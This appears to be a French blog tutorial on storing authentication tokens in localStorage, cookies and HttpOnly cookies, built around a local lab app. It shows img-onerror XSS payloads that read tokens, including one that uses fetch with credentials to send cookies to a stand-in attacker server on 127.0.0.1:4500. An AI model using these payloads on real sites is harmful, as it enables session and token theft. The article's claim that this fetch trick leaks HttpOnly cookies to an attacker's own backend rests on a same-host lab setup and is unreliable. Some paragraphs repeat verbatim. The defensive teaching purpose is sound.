Il m'arrive souvent de devoir développer des applications qui possèdent d'une part un backend, généralement développé avec le framework Symfony, et d'autre part un frontend (React par exemple). Souvent, ce qui est fait, c'est que le front sauvegarde un token d'authentification soit dans le localStorage, soit dans les cookies afin de le transmettre au backend et authentifier l'utilisateur.

Très bien, mais il y a des soucis dans cette manière de faire :

- le localStorage est vulnérable aux attaques XSS ;
- les cookies sont également vulnérables aux attaques XSS.

En effet, les données sauvegardées en localStorage ou dans les cookies sont accessibles par du code JS malveillant qui aurait été injecté dans votre page au travers d'une faille XSS.

Comment s'en prémunir ? Peut-être pouvons-nous penser aux cookies avec le flag HttpOnly ?

Voyons pourquoi cette solution n'est pas la bonne et que la meilleure solution pour protéger votre application est d'évter les failles XSS, tout simplement.

## Que sont les cookies HttpOnly

Aujourd'hui, les cookies sont présents partout sur nos applications. En effet, ils permettent, coté client, de stocker un état, comme la session d'un utilisateur. Vous voyez la fonctionnalité "Se souvenir de moi" sur de nombreueses applications ? Un cookie se cache par là ! Et les informations que contiennent les cookies sont souvent sensibles, il faut donc les protéger contre les tentatives de piratage !

![Cookie](/images/blog/articles/http-only-xss-attacks/cookie.jpg?style=centerme)
_Les cookies, essentiels pour stocker des informations sensible coté client_


Les cookies sont stockés coté client sur la demande de votre backend. Pour cela, le backend vous envoie un header dans la réponse nommé `Set-Cookie` qui contient, entre autres, le nom et la valeur du cookie. Voyez la documentation sur le [MDN](https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Set-Cookie).

Dans cet en-tête `Set-Cookie` deux informations sont importantes :

- Secure : les cookies portant le flag `Secure` ne sont envoyés que si la requête est https ; 
- HttpOnly : empêche du code JS d'accéder aux cookies portant cette notion de `HttpOnly`.

Un cookie déclaré comme étant HttpOnly n'est donc pas accessible via du code JS. Si vous faîtes un `document.cookie` vous ne les verrez pas. Ainsi, si vous avez une faille XSS qui autorise une personne malveillante à injecter du code JS dans vos pages, elle n'aura pas accès à ces cookies.

Voyons la liste des cookies retournés par un `document.cookie` sur ma console Chrome à partir du site de Twitter :

![Cookie](/images/blog/articles/http-only-xss-attacks/twitter_cookie.png?style=centerme)
_Liste des cookies sur mon twitter_

Et maintenant, regardez la liste complète de mes cookies sur le domaine de Twitter :

![Cookie](/images/blog/articles/http-only-xss-attacks/twitter_cookie_httponly.png?style=centerme)
_Liste des cookies sur mon twitter_

Comme vous pouvez le voir, les cookies HttpOnly n'apparaissent pas dans un `docuemnt.cookie`.

De manière générale, toutes les informations sensibles doivent être dans des cookies HttpOnly. Mais est-ce suffisant ? Voyons ça avec plusieurs solutions pour stocker les informations sensibles :

- dans le localStorage ;
- dans des cookies ;
- dans des cookies HttpOnly.

## Le code pour suivre cet article

Voici le code que je vais utiliser dans la suite de l'article. Il vous permettra de tester chacunes des solutions ci-dessous.

- [code pour le stockage dans le localStorage](/data/blog/http-only-xss-attacks/code-localstorage.zip) ;
- [code pour le stockage dans un cookie simple](/data/blog/http-only-xss-attacks/code-cookie.zip) ;
- [code pour le stockage dans un cookie HttpOnly](/data/blog/http-only-xss-attacks/code-cookie-httponly.zip).

Pour chaque code téléchargé, vous aurez un dossier comprenant le partie backend et la partie frontend.

- le backend : contenant le code du backend. Il est développé de manière très simple avec NodeJS et avec des faux tokens, non cryptés. Ce n'est que pour l'exemple, bien sûr ;
- le frontend : un simple front avec une page `ndex.html`et un fichier `app.js` permettant au clic sur un bouton de se connecter (le backend est appelé et renvoie un token stocké soit dans le localStorage soit dans un cookie) et au clic sur un autre bouton d'ajouter un commentaire avec une faille XSS.

Vous pouvez démarrer le projet en exécutant, les commandes suivantes : 

```
npm ci
node app.js
```

Puis allez sur `http://127.0.0.1:3000`.

## Utilisons le localStorage

Une fois que le projet est démarré, vous devriez avoir une page qui ressemble à ça :

![Démarrage projet](/images/blog/articles/http-only-xss-attacks/local_storage1.png?style=centerme)
_Démarrage du projet_

Avant tout, cliquez sur "Connexion". À ce moment-là, un appel au backend est fait et ce dernier nous renvoie un token que l'on peut stocker dans le localStorage :

```js
window.localStorage.setItem('token', token);
```

Ensuite, entrez un commentaire puis envoyez-le au backend. Il vous le renverra et le front pourra ensuite l'ajouter au DOM. Entrez par exemple "Un exemple de commentaire.". Vous le verrez apparaître.

Aujourd'hui, les principaux navigateurs nous empêchent d'exécuter des balises `<script>` ajoutées dynamiquement au DOM. Pour prévenir les attaques XSS justement. Mais il y a une parade bien connue, les images ! Entrez donc ce commentaire :

```html
<img src="http://fake-image.org/fake.png" onerror="alert(window.localStorage.getItem('token'));">
```

Voyez ce qui se passe :

![XSS](/images/blog/articles/http-only-xss-attacks/local_storage2.png?style=centerme)
_Faille XSS, apparition du token_

Hum, pas génial. Ici, nous affichons simplement le token. Bien sûr, dans la réalité, une personne malintentionnée l'enverra sur son propre backend et aura ainsi vos accès.

## Utilisons les cookies (sans HttpOnly)

Plutôt que de stocker dans le localStorage, voyons pour le stocker dans les cookies (sans l'option HttpOnly). Le process reste le même, nous cliquons sur "Connexion", cela fera un appel au backend qui ajoute un header Set-Cookie pour dire au client de créer un cookie. Voici le code fait dans le backend :

```js
  res.cookie('token', 'my-secret-token', { maxAge: 900000 });
```

Le cookie apparaît dans le client :

![Cookie Client](/images/blog/articles/http-only-xss-attacks/cookie1.png?style=centerme)
_Le cookie apparaît dans le client_

Ajoutons un commentaire mal-intentionné :

```html
<img src="http://fake-image.org/fake.png" onerror="alert(document.cookie);">
```

Eh mince, le cookie peut aussi être piraté part une faille XSS.

Bon, on a pas trop le choix, on va essayer de sécuriser tout ça avec un cookie HttpOnly.

Voici le résultat :

![XSS Cookie](/images/blog/articles/http-only-xss-attacks/cookie2.png?style=centerme)
_Le cookie apparaît en clair dans le client_

Mince, le cookie peut aussi être piraté part une faille XSS.

Bon, on n'a pas trop le choix, on va essayer de sécuriser tout ça avec un cookie HttpOnly.

## Utilisons les cookies (avec HttpOnly)

Cette fois-ci, je compte bien faire en sorte que mon token reste secret ! Faisons en sorte que notre cookie ait le flag HttpOnly. Au moins nous serons sûr qu'aucun code JS n'y aura accès du coté du client !

Il n'y a vraiment pas grand chose à changer pour transformer notre cookie en cookie HttpOnly. Voyez la ligne que je modifie dans le code du backend :

```js
  res.cookie('token', 'my-secret-token', { maxAge: 900000, httpOnly: true });
```

Nous récupérons bien notre cookie HttpOnly, la preuve :

![Cookie HttpOnly](/images/blog/articles/http-only-xss-attacks/cookie_httponly1.png?style=centerme)
_Le cookie est protégé contre les accès coté client_

Ajoutons le même commentaire mal-intentionné que tout à l'heure :

```html
<img src="http://fake-image.org/fake.png" onerror="alert(document.cookie);">
```

![Cookie HttpOnly Sécurisé](/images/blog/articles/http-only-xss-attacks/cookie_httponly2.png?style=centerme)
_Le client ne peut pas voir les cookies_

Yeah, malgré la faille XSS sur mon application, le client ne peut pas lire les cookies avec du JS et le hacker ne pourra pas voler mes informations !

Yeah, malgré la faille XSS sur mon application, le client ne peut pas lire les cookies avec du JS et le hacker ne pourra pas voler mes informations !

Bon, du coup, HttpOnly est une bonne solution ? Pas si vite, essayons de contourner ça !

## Contourner les cookies HttpOnly

Les essais qui vont suivre ont été faits sur la même base de code que ci-dessus, avec les cookies HttpOnly.

Les cookies se trouvent du coté du client et sont transmis automatiquement au backend si je fais un appel Ajax, voyons cela en ajoutons un commentaire qui fera un appel Ajax :

```html
<img src="http://fake-image.org/fake.png" onerror="fetch('/fake');">
```

![Cookie HttpOnly Transmission](/images/blog/articles/http-only-xss-attacks/cookie_httponly3.png?style=centerme)
_Les cookies sont transmis au backend_

Bon, le backend dans ce cas, est le mien. Je sais ce que je fais dans le back pas de soucis, le pirate n'a toujours pas mon cookie. Mais s'il fait un appel Ajax à son backend à lui ? Voyons cela :

```html
<img src="http://fake-image.org/fake.png" onerror="fetch('http://127.0.0.1:4500');">
```

![Cookie HttpOnly Transmission](/images/blog/articles/http-only-xss-attacks/cookie_httponly4.png?style=centerme)
_Les cookies ne lui sont pas transmis !_

Ouf, les cookies ne lui sont pas transmis.

Mais attendez ! Il existe une parade ! Regardez

```html
<img src="https://fake-image.org/fake.png" onerror="fetch('http://127.0.0.1:4500', { credentials: 'include' });">
```

![Cookie HttpOnly Transmission](/images/blog/articles/http-only-xss-attacks/cookie_httponly5.png?style=centerme)
_Les cookies sont transmis au hacker !_

Voilà, en ajoutant l'option `credentials: 'include'` à fetch il transmet les cookies dans les headers de la requête Http. Le pirate a réussi à récupérer nos informations.

## Conclusion

Comme nous venons de le voir, mettre ses informations sécrètes dans le localStorage, dans les cookies ou dans les cookies possédant le flag HttpOnly ne nous garanti pas une sécurité optimale. Aucune de ces solutions ne pourra empêcher un hacker d'exploiter une faille XSS et de mettre la main sur vos informations secrètes.

La seule solution afin de sécuriser vos données et de ne pas avoir de faille XSS. Aussi simple que cela. :)